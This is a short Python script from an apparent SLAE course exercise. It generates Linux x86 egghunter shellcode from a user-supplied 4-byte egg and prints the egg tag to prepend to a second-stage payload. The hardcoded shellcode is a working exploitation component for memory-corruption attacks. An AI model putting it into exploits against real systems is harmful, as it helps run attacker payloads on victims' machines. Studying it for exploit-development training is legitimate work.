#!/usr/bin/python

# Filename: getEgghunter.py
# Author: Jonathan So
# Student ID: SLAE-1470
# SLAE-Exercise 3

import binascii
import sys
import os
import getopt

def usage():
	print('getEgghunter.py -e egg | -h help')	

def main(argv):
	port = 0
	ip = ''
	hexPort = ''
	hexIP = ''
	if(len(sys.argv) < 2):
		usage()
		sys.exit()
	try:
		opts,args = getopt.getopt(sys.argv[1:], "he:", ["help", "egg="])
	except getopt.GetoptError:
		usage()
		sys.exit(2)
	for opt, arg in opts:
		if opt in ("-h", "--help"):
			usage()
			sys.exit()
		elif opt in ("-e", "--egg"):
			egg = arg
			print('Egg: ' + egg)
			if len(egg) != 4:
				print('Invalid Egg, length must be 4 characters')
				sys.exit(2)
	hexEgg = ''
	for char in egg:
		hexEgg = ('\\x' + bytes.decode(binascii.hexlify(str.encode(char)))) + hexEgg

	Shellcode = "\\x66\\x81\\xc9\\xff\\x0f\\x41\\x6a\\x43\\x58\\xcd\\x80\\x3c\\xf2\\x74\\xf1\\xb8"
	Shellcode +=hexEgg 
	Shellcode +="\\x89\\xcf\\xaf\\x75\\xec\\xaf\\x75\\xe9\\xff\\xe7"
	
	print('Egghunter: ' + Shellcode)
	print('Paste this in front of your shellcode')
	print('"' + hexEgg + '"')
	print('"' + hexEgg + '"')

if __name__ == '__main__':
	main(sys.argv[1:])
